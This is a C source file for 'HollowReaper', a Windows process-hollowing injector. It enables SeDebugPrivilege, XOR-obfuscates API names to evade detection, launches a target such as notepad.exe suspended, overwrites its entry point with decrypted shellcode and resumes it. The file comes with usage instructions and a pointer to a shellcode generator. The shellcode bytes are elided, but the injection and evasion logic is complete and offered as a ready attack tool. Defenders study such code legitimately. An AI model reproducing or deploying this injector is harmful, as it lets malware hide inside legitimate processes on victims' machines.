/*

    Author: vari.sh

    Description: This program implements process hollowing on an arbitrary process that can be passed as parameter or through stdin.
                 The shellcode should be xored with the chosen key and inserted inside shellcode_enc.
                 To obtain the shellcode I compiled a C program and then I extracted the shellcode with https://github.com/TheWover/donut,
                 then i used a python script to xor it.
                 Warning: it needs Administrator privileges.

    Usage: .\HollowReaper.exe "C:\windows\system32\notepad.exe"

*/

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


// --- Types and constants ---

// Definition of NTSTATUS and the STATUS_SUCCESS value
typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0)

// PROCESS_BASIC_INFORMATION (not exported in the standard headers)
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID ExitStatus;
    PVOID PebBaseAddress;
    PVOID AffinityMask;
    PVOID BasePriority;
    ULONG_PTR UniqueProcessId;
    PVOID InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;

// Constant for creating a suspended process
#define CREATE_SUSPENDED_FLAG 0x00000004

// --- Delegates (typedef) for the APIs ---

typedef BOOL(WINAPI* PFN_CPW)(
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
    );

typedef BOOL(WINAPI* PFN_RPM)(
    HANDLE hProcess,
    LPCVOID lpBaseAddress,
    LPVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T* lpNumberOfBytesRead
    );

typedef BOOL(WINAPI* PFN_WPM)(
    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T* lpNumberOfBytesWritten
    );

typedef DWORD(WINAPI* PFN_RT)(HANDLE hThread);

typedef NTSTATUS(WINAPI* PFN_ZQIP)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

// --- XOR deobfuscation functions ---
//
// The key used (20 characters):
static const char XOR_KEY[] = "0123456789abcdefghij"; // length 20

// Function to decrypt a string (not null-terminated in the encrypted data)
char* xor_decrypt_string(const unsigned char* cipher, size_t len, const char* key, size_t key_len)
{
    char* result = (char*)malloc(len + 1);
    if (!result) return NULL;
    for (size_t i = 0; i < len; i++) {
        result[i] = cipher[i] ^ key[i % key_len];
    }
    result[len] = '\0';
    return result;
}

// Function to decrypt a buffer in-place (e.g., for shellcode)
void xor_decrypt_buffer(unsigned char* buffer, size_t len, const char* key, size_t key_len)
{
    for (size_t i = 0; i < len; i++) {
        buffer[i] ^= key[i % key_len];
    }
}

// --- Obfuscated strings (using XOR) ---
//
// To obtain the clear text, use the function xor_decrypt_string()
// The data below was obtained manually starting from the clear text and 
// applying the XOR algorithm with the key XOR_KEY (repeated if necessary).
//
// 1. "CreateProcessW" (14 characters)
static const unsigned char CPW_ENC[] = {
    0x73, 0x43, 0x57, 0x52, 0x40, 0x50, 0x66, 0x45, 0x57, 0x5A, 0x04, 0x11, 0x10, 0x33
};
// 2. "ReadProcessMemory" (17 characters)
static const unsigned char RPM_ENC[] = {
    0x62, 0x54, 0x53, 0x57, 0x64, 0x47, 0x59, 0x54, 0x5D, 0x4A, 0x12, 0x2F, 0x06, 0x09, 0x0A, 0x14, 0x1E
};
// 3. "WriteProcessMemory" (18 characters)
static const unsigned char WPM_ENC[] = {
    0x67, 0x43, 0x5B, 0x47, 0x51, 0x65, 0x44, 0x58, 0x5B, 0x5C, 0x12, 0x11, 0x2E, 0x01, 0x08, 0x09, 0x15, 0x11
};
// 4. "ResumeThread" (12 characters)
static const unsigned char RT_ENC[] = {
    0x62, 0x54, 0x41, 0x46, 0x59, 0x50, 0x62, 0x5F, 0x4A, 0x5C, 0x00, 0x06
};
// 5. "ZwQueryInformationProcess" (25 characters)
static const unsigned char ZQIP_ENC[] = {
    0x6A, 0x46, 0x63, 0x46, 0x51, 0x47, 0x4F, 0x7E, 0x56, 0x5F, 0x0E, 0x10, 0x0E, 0x05, 0x11,
    0x0F, 0x08, 0x06, 0x39, 0x18, 0x5F, 0x52, 0x57, 0x40, 0x47
};

// --- Utility function: conversion of an ANSI string to a wide string ---
wchar_t* to_wide(const char* str)
{
    int len = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
    if (len == 0) return NULL;
    wchar_t* wstr = (wchar_t*)malloc(len * sizeof(wchar_t));
    if (!wstr) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, str, -1, wstr, len);
    return wstr;
}

// --- Main ---
int main(int argc, char* argv[])
{
    // 0. Local variables
    HANDLE hToken = NULL;
    LUID luid;
    TOKEN_PRIVILEGES tp;
    BOOL bResult;

    // 1. Enabling SeDebugPrivilege
    printf("[*] Requesting SeDebugPrivilege...\n");
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("OpenProcessToken failed, error: %lu\n", GetLastError());
        return 1;
    }
    if (!LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &luid)) {
        printf("LookupPrivilegeValue failed, error: %lu\n", GetLastError());
        return 1;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges->Attributes = SE_PRIVILEGE_ENABLED;
    tp.Privileges->Luid = luid;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL)) {
        printf("AdjustTokenPrivileges failed, error: %lu\n", GetLastError());
        return 1;
    }
    if (GetLastError() != ERROR_SUCCESS) {
        printf("AdjustTokenPrivileges reported an error: %lu\n", GetLastError());
        return 1;
    }
    printf("[*] SeDebugPrivilege enabled.\n");

    // 2. Load the DLLs kernel32.dll and ntdll.dll
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) {
        printf("Error loading kernel32.dll\n");
        return 1;
    }
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) {
        printf("Error loading ntdll.dll\n");
        return 1;
    }

    // 3. Deobfuscate the API names (using XOR)
    size_t key_len = strlen(XOR_KEY);
    char* strCPW = xor_decrypt_string(CPW_ENC, sizeof(CPW_ENC), XOR_KEY, key_len);
    char* strRPM = xor_decrypt_string(RPM_ENC, sizeof(RPM_ENC), XOR_KEY, key_len);
    char* strWPM = xor_decrypt_string(WPM_ENC, sizeof(WPM_ENC), XOR_KEY, key_len);
    char* strRT = xor_decrypt_string(RT_ENC, sizeof(RT_ENC), XOR_KEY, key_len);
    char* strZQIP = xor_decrypt_string(ZQIP_ENC, sizeof(ZQIP_ENC), XOR_KEY, key_len);

    if (!strCPW || !strRPM || !strWPM ||
        !strRT || !strZQIP) {
        printf("Error deobfuscating API names.\n");
        return 1;
    }

    // 4. Get the addresses of the functions via GetProcAddress
    // pCreateProcessW
    PFN_CPW pCPW = (PFN_CPW)GetProcAddress(hKernel32, strCPW);
    // pReadProcessMemory
    PFN_RPM pRPM = (PFN_RPM)GetProcAddress(hKernel32, strRPM);
    // pWriteProcessMemory
    PFN_WPM pWPM = (PFN_WPM)GetProcAddress(hKernel32, strWPM);
    // pResumeThread
    PFN_RT pRT = (PFN_RT)GetProcAddress(hKernel32, strRT);
    // pZwQueryInformationProcess
    PFN_ZQIP pZQIP = (PFN_ZQIP)GetProcAddress(hNtdll, strZQIP);

    if (!pCPW || !pRPM || !pWPM ||
        !pRT || !pZQIP) {
        printf("Error retrieving API addresses.\n");
        return 1;
    }

    // Free the deobfuscated strings (no longer needed)
    free(strCPW);
    free(strRPM);
    free(strWPM);
    free(strRT);
    free(strZQIP);

    // 5. Request the target executable path
    char exePathA[MAX_PATH] = { 0 };
    if (argc > 1) {
        strncpy(exePathA, argv[1], MAX_PATH - 1);
        printf("[*] Path provided from command line: %s\n", exePathA);
    }
    else {
        printf("Enter the full path of the executable: ");
        if (!fgets(exePathA, sizeof(exePathA), stdin)) {
            printf("Error reading the path.\n");
            return 1;
        }
        // Remove the newline character
        exePathA[strcspn(exePathA, "\r\n")] = '\0';
    }
    if (strlen(exePathA) == 0) {
        printf("Invalid path!\n");
        return 1;
    }
    // Convert the path to a wide string
    wchar_t* exePathW = to_wide(exePathA);
    if (!exePathW) {
        printf("Error converting the path to Unicode.\n");
        return 1;
    }

    // 6. Create the process in a suspended state
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    bResult = pCPW(
        exePathW,            // lpApplicationName
        NULL,                // lpCommandLine
        NULL,                // lpProcessAttributes
        NULL,                // lpThreadAttributes
        FALSE,               // bInheritHandles
        CREATE_SUSPENDED_FLAG, // dwCreationFlags
        NULL,                // lpEnvironment
        NULL,                // lpCurrentDirectory
        &si,                 // lpStartupInfo
        &pi                  // lpProcessInformation
    );
    free(exePathW); // no longer needed
    if (!bResult) {
        printf("Error creating the process, code: %lu\n", GetLastError());
        return 1;
    }
    printf("[*] Process created in suspended state, PID: %lu\n", pi.dwProcessId);

    // 7. Obtain the target process's PEB using ZwQueryInformationProcess
    PROCESS_BASIC_INFORMATION pbi;
    ULONG retLen = 0;
    NTSTATUS ntStatus = pZQIP(
        pi.hProcess,
        0, // ProcessBasicInformation
        &pbi,
        sizeof(pbi),
        &retLen
    );
    if (ntStatus != STATUS_SUCCESS) {
        printf("ZwQueryInformationProcess failed, NTSTATUS: 0x%lX\n", ntStatus);
        return 1;
    }
    printf("[*] The process's PEB is located at: %p\n", pbi.PebBaseAddress);

    // 8. Read the ImageBaseAddress from the PEB
    // (in this example it is assumed that the ImageBaseAddress is located at PEB+0x10)
    // NOTE: this internal structure may vary between Windows versions!
    LPVOID imageBaseAddress = NULL;
    SIZE_T bytesRead = 0;
    // Calculate the address: (char*)PEB + 0x10
    LPCVOID addrImageBase = (LPCVOID)((char*)pbi.PebBaseAddress + 0x10);
    if (!pRPM(pi.hProcess, addrImageBase, &imageBaseAddress, sizeof(imageBaseAddress), &bytesRead)) {
        printf("ReadProcessMemory (ImageBaseAddress) failed, error: %lu\n", GetLastError());
        return 1;
    }
    printf("[*] The Image Base Address is: %p\n", imageBaseAddress);

    // 9. Read the PE header to obtain the EntryPoint
    // Read the first 0x200 bytes from the ImageBaseAddress
    unsigned char headerBuffer[0x200] = { 0 };
    if (!pRPM(pi.hProcess, imageBaseAddress, headerBuffer, sizeof(headerBuffer), &bytesRead)) {
        printf("ReadProcessMemory (PE header) failed, error: %lu\n", GetLastError());
        return 1;
    }
    // Read the e_lfanew offset (at offset 0x3C)
    DWORD e_lfanew = *(DWORD*)(headerBuffer + 0x3C);
    // The EntryPoint RVA is located at (e_lfanew + 0x28) in the Optional Header (for PE32)
    DWORD entryPointRVA = *(DWORD*)(headerBuffer + e_lfanew + 0x28);
    LPVOID entryPointAddr = (LPVOID)((char*)imageBaseAddress + entryPointRVA);
    printf("[*] The process EntryPoint is: %p\n", entryPointAddr);

    // 10. Prepare and write the shellcode to the EntryPoint
    unsigned char shellcode_enc[] = { 0xD8, 0xF1, 0x7F ... }; // xored shellcode
    size_t shellcode_len = sizeof(shellcode_enc);
    // Decrypt in-place
    xor_decrypt_buffer(shellcode_enc, shellcode_len, XOR_KEY, key_len);
    // Write the shellcode into the target process
    SIZE_T bytesWritten = 0;
    if (!pWPM(pi.hProcess, entryPointAddr, shellcode_enc, shellcode_len, &bytesWritten)) {
        printf("WriteProcessMemory failed, error: %lu\n", GetLastError());
        return 1;
    }
    printf("[*] Shellcode written at the EntryPoint.\n");

    // 11. Resume the main thread of the suspended process
    DWORD suspendCount = pRT(pi.hThread);
    printf("[*] Thread resumed, suspend count: %lu\n", suspendCount);

    // Cleanup: close the used handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    if (hToken)
        CloseHandle(hToken);

    printf("[*] Operation completed.\n");
    return 0;
}
